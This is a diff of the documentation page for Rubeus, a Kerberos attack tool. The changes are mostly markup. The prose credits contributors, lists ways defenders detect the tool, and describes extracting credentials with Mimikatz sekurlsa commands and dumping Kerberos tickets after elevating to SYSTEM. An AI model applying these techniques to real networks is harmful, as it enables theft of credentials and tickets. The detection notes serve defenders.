+<p><a href="https://twitter.com/exploitph" class="outbound" target="_blank"><span>Charlie Clark</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a> and <a href="https://twitter.com/_EthicalChaos_" class="outbound" target="_blank"><span>Ceri Coburn</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a> have both made <em>significant</em> contributions to the Rubeus codebase. <a href="https://twitter.com/elad_shamir" class="outbound" target="_blank"><span>Elad Shamir</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a> contributed some essential work for resource-based constrained delegation. Their work is very appreciated!</p>
+<p>Rubeus also uses a C# ASN.1 parsing/encoding library from <a href="https://github.com/pornin" class="outbound" target="_blank"><span>Thomas Pornin</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a> named <a href="https://github.com/pornin/DDer" class="outbound" target="_blank"><span>DDer</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a> that was released with an &quot;MIT-like&quot; license. Huge thanks to Thomas for his clean and stable code!</p>
+<p>PKINIT code heavily adapted from <a href="https://twitter.com/SteveSyfuhs" class="outbound" target="_blank"><span>@SteveSyfuhs</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>&#x27;s <a href="https://github.com/dotnet/Kerberos.NET" class="outbound" target="_blank"><span>Bruce</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a> tool. Bruce made RFC4556 (PKINIT) a lot easier to understand. Huge thanks to Steve!</p>
+<p>The <a href="https://msdn.microsoft.com/en-us/library/system.identitymodel.tokens.kerberosrequestorsecuritytoken.getrequest(v=vs.110).aspx" class="outbound" target="_blank"><span>KerberosRequestorSecurityToken.GetRequest</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a> method for Kerberoasting was contributed to PowerView (and then incorporated into Rubeus) by <a href="https://twitter.com/machosec" class="outbound" target="_blank"><span>@machosec</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>.</p>
+<p><a href="https://twitter.com/harmj0y" class="outbound" target="_blank"><span>@harmj0y</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a> is the primary author of this code base.</p>
 <p>Rubeus is licensed under the BSD 3-Clause license.</p>
 <doc-anchor-target id="table-of-contents">
     <h2>
@@ -329,7 +330,7 @@
     </h3>
 </doc-anchor-target>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">   ______        _
+<pre translate="no" class="language-none"><code v-pre class="language-none">   ______        _
   (_____ \      | |
    _____) )_   _| |__  _____ _   _  ___
   |  __  /| | | |  _ \| ___ | | | |/___)
@@ -500,7 +501,7 @@
         <span>Overview</span>
     </h4>
 </doc-anchor-target>
-<p>Any action you perform on a system is a detectable risk, especially when abusing functionality in &quot;weird&quot;/unintended ways. Rubeus (like any attacker toolset) can be detected in a number of methods, either from the host, network, or domain perspectives. I have a workmate who is fond of stating <em>&quot;everything is stealthy until someone is looking for it&quot;</em> - tools and techniques generally evade detection because either a) people are not sufficiently aware of the tool/technique and therefore not even looking, b) people can not collect and process the data needed at the appropriate scale, or c) the tool/technique blends with existing behavior to sufficiently sneak in with false positives in an environment. There is much more information on these steps and detection subversion in general in <a href="https://twitter.com/mattifestation" class="outbound" target="_blank"><span>Matt Graeber</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a> and <a href="https://twitter.com/tifkin_" class="outbound" target="_blank"><span>Lee Christensen</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>’s Black Hat USA 2018 <a href="https://i.blackhat.com/us-18/Wed-August-8/us-18-Graeber-Subverting-Sysmon-Application-Of-A-Formalized-Security-Product-Evasion-Methodology.pdf" class="outbound" target="_blank"><span>“Subverting Sysmon”</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a> talk and associated <a href="https://specterops.io/assets/resources/Subverting_Sysmon.pdf" class="outbound" target="_blank"><span>whitepaper</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>.</p>
+<p>Any action you perform on a system is a detectable risk, especially when abusing functionality in &quot;weird&quot;/unintended ways. Rubeus (like any attacker toolset) can be detected in a number of methods, either from the host, network, or domain perspectives. I have a workmate who is fond of stating <em>&quot;everything is stealthy until someone is looking for it&quot;</em> - tools and techniques generally evade detection because either a) people are not sufficiently aware of the tool/technique and therefore not even looking, b) people can not collect and process the data needed at the appropriate scale, or c) the tool/technique blends with existing behavior to sufficiently sneak in with false positives in an environment. There is much more information on these steps and detection subversion in general in <a href="https://twitter.com/mattifestation" class="outbound" target="_blank"><span>Matt Graeber</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a> and <a href="https://twitter.com/tifkin_" class="outbound" target="_blank"><span>Lee Christensen</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>’s Black Hat USA 2018 <a href="https://i.blackhat.com/us-18/Wed-August-8/us-18-Graeber-Subverting-Sysmon-Application-Of-A-Formalized-Security-Product-Evasion-Methodology.pdf" class="outbound" target="_blank"><span>“Subverting Sysmon”</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a> talk and associated <a href="https://specterops.io/assets/resources/Subverting_Sysmon.pdf" class="outbound" target="_blank"><span>whitepaper</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>.</p>
 <p>From the host perspective, Rubeus can be caught during initial <doc-anchor-trigger to="#weaponization">weaponization</doc-anchor-trigger> of the code itself, by an abnormal (non-lsass.exe) process issuing raw Kerberos port 88 traffic, through the use of sensitive APIs like LsaCallAuthenticationPackage(), or by abnormal tickets being present on the host (e.g. rc4_hmac use in tickets in a modern environment).</p>
 <p>From a network or domain controller log perspective, since Rubeus implements many parts of the normal Kerberos protocol, the main detection method involves the use of rc4_hmac in Kerberos exchanges. Modern Windows domains (functional level 2008 and above) use AES encryption by default in normal Kerberos exchanges (with a few exceptions like inter-realm trust tickets). Using a rc4_hmac (NTLM) hash is used in a Kerberos exchange instead of a aes256_cts_hmac_sha1 (or aes128) key results in some signal that is detectable at the host level, network level (if Kerberos traffic is parsed), and domain controller event log level, sometimes known as &quot;encryption downgrade&quot;.</p>
 <doc-anchor-target id="weaponization">
@@ -510,7 +511,7 @@
     </h4>
 </doc-anchor-target>
 <p>One common way attack tools are detected is through the weaponization vector for the code. If Rubeus is run <doc-anchor-trigger to="#sidenote-running-rubeus-through-powershell">through PowerShell</doc-anchor-trigger> (this includes Empire) the standard PowerShell V5 protections all apply (deep script block logging, AMSI, etc.). If Rubeus is executed as a binary on disk, standard AV signature detection comes into play (part of why we <doc-anchor-trigger to="#compile-instructions">do not release</doc-anchor-trigger> compiled versions of Rubeus, as brittle signatures are silly ; ). If Rubeus is used as a <doc-anchor-trigger to="#sidenote-building-rubeus-as-a-library">library</doc-anchor-trigger> then it&#x27;s susceptible to whatever method the primary tool uses to get running. And if Rubeus is run through unmanaged assembly execution (like Cobalt Strike&#x27;s <code v-pre>execute_assembly</code>) cross-process code injection is performed and the CLR is loaded into a potentially non-.NET process, though this signal is present for the execution of any .NET code using this method.</p>
-<p>Also, AMSI (the Antimalware Scan Interface) has been <a href="https://blogs.msdn.microsoft.com/dotnet/2018/11/28/announcing-net-framework-4-8-early-access-build-3694/" class="outbound" target="_blank"><span>added to .NET 4.8</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>. <a href="https://twitter.com/cobbr_io" class="outbound" target="_blank"><span>Ryan Cobb</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a> has additional details on the offensive implications of this in the <strong>Defense</strong> section of his <a href="https://posts.specterops.io/entering-a-covenant-net-command-and-control-e11038bcf462" class="outbound" target="_blank"><span>“Entering a Covenant: .NET Command and Control”</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a> post.</p>
+<p>Also, AMSI (the Antimalware Scan Interface) has been <a href="https://blogs.msdn.microsoft.com/dotnet/2018/11/28/announcing-net-framework-4-8-early-access-build-3694/" class="outbound" target="_blank"><span>added to .NET 4.8</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>. <a href="https://twitter.com/cobbr_io" class="outbound" target="_blank"><span>Ryan Cobb</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a> has additional details on the offensive implications of this in the <strong>Defense</strong> section of his <a href="https://posts.specterops.io/entering-a-covenant-net-command-and-control-e11038bcf462" class="outbound" target="_blank"><span>“Entering a Covenant: .NET Command and Control”</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a> post.</p>
 <doc-anchor-target id="example-credential-extraction">
     <h4>
         <doc-anchor-trigger class="header-anchor-trigger" to="#example-credential-extraction">#</doc-anchor-trigger>
@@ -518,18 +519,18 @@
     </h4>
 </doc-anchor-target>
 <p>Say we have elevated access on a machine and want to extract user credentials for reuse.</p>
-<p>Mimikatz is the swiss army knife of credential extraction, with multiple options. The <code v-pre>sekurlsa::logonpasswords</code> command will open up a <a href="https://github.com/gentilkiwi/mimikatz/blob/a0f243b33590751a77b6d6f275313a4fe8d42c82/mimikatz/modules/sekurlsa/kuhl_m_sekurlsa.c#L168" class="outbound" target="_blank"><span>read handle to LSASS</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>, enumerate logon sessions present on the system, walk the default authentication packages for each logon session, and extract any reverseable password/credential material present. <strong>Sidenote</strong>: the <code v-pre>sekurlsa::ekeys</code> command will enumerate ALL key types present for the Kerberos package.</p>
-<p>Rubeus doesn&#x27;t have any code to touch LSASS (and none is intended), so its functionality is limited to extracting Kerberos tickets through use of the LsaCallAuthenticationPackage() API. From a non-elevated standpoint, the session keys for TGTs are not returned (by default) so only service tickets extracted will be usable (the <strong>tgtdeleg</strong> command uses a Kekeo trick to get a usable TGT for the current user). If in a high-integrity context, a <a href="https://github.com/GhostPack/Rubeus/blob/4c9145752395d48a73faf326c4ae57d2c565be7f/Rubeus/lib/Helpers.cs#L55-L107" class="outbound" target="_blank"><span>GetSystem</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a> equivalent utilizing token duplication is run to elevate to SYSTEM, and a fake logon application is registered with the LsaRegisterLogonProcess() API call. This allows for privileged enumeration and extraction of all tickets currently registered with LSA on the system, resulting in base64 encoded .kirbi&#x27;s being output for later reuse.</p>
